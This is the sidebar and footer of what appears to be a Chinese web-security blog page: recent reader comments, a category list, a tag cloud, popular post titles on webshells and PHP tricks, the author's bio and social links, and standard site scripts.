            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>分类</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>随机标签</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/sqlite3_exec.html">sqlite3_exec</a>
        
        <a rel="tag" href="../tag/%E5%AF%92%E5%81%87.html">寒假</a>
        
        <a rel="tag" href="../tag/2019.html">2019</a>
        
        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
        
        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E8%A1%8C.html">命令行</a>
        
        <a rel="tag" href="../tag/php.html">php</a>
        
        <a rel="tag" href="../tag/CRLF.html">CRLF</a>
        
        <a rel="tag" href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
        
        <a rel="tag" href="../tag/VS2010.html">VS2010</a>
        
        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
        
        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
        
        <a rel="tag" href="../tag/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html">原型链污染</a>
        
        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
        
        <a rel="tag" href="../tag/%E9%98%BB%E6%AD%A2%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C.html">阻止脚本运行</a>
        
        <a rel="tag" href="../tag/%E7%AD%94%E6%A1%88.html">答案</a>
        
        <a rel="tag" href="../tag/django.html">django</a>
        
        <a rel="tag" href="../tag/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0.html">断点续传</a>
        
        <a rel="tag" href="../tag/%E9%93%BE%E8%A1%A8.html">链表</a>
        
        <a rel="tag" href="../tag/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html">信息泄露</a>
        
        <a rel="tag" href="../tag/getshell.html">getshell</a>
        
        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">命令执行漏洞</a>
        
        <a rel="tag" href="../tag/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html">反向代理</a>
        
        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
        
        <a rel="tag" href="../tag/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8.html">前端安全</a>
        
        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
        
        <a rel="tag" href="../tag/API%E5%87%BD%E6%95%B0.html">API函数</a>
        
        <a rel="tag" href="../tag/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.html">条件竞争</a>
        
        <a rel="tag" href="../tag/webshell.html">webshell</a>
        
        <a rel="tag" href="../tag/%E8%84%B1%E8%A3%A4.html">脱裤</a>
        
        <a rel="tag" href="../tag/SQL.html">SQL</a>
        
    </div>
  </div>

  <div class="widget widget-recent-entries">
	<h3 class="widget-title">热门日志</h3>
	<ul id="hotlog" class="widget-list">
    
    
        <li><a href="../other/tinger.html">About.Me</a></li>
    
        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
    
        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
    
        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
    
        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
    
    </ul>
  </div>
  

</div>
</div>

<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">
			<div class="col-6 columns">
			<h3>Little About</h3>
			<p>Phithon 非强迫症小青年  <br>
现居先 <br>
爱好：种花、买书、收藏明信片 <br>
欢迎各大组织收留 <br>
E-mail：root@leavesongs.com </p>
			</div>

			<div class="col-10 columns">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
        </div>
        <div class="bot-line"></div>
				<p class="copyright">
	Copyright &copy; Powered by talkbook
				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
                    <a href="../index.html">更换模板</a>
				</p>
			</div>
		</div>
	</div>
	<!-- /copyright -->
</div>
<a href="#" id="go-top">Top ↑</a>
<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
<script src="../static/deep/js/config.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function () {
    $(".entry a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $(".entry img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>

</body>

</html>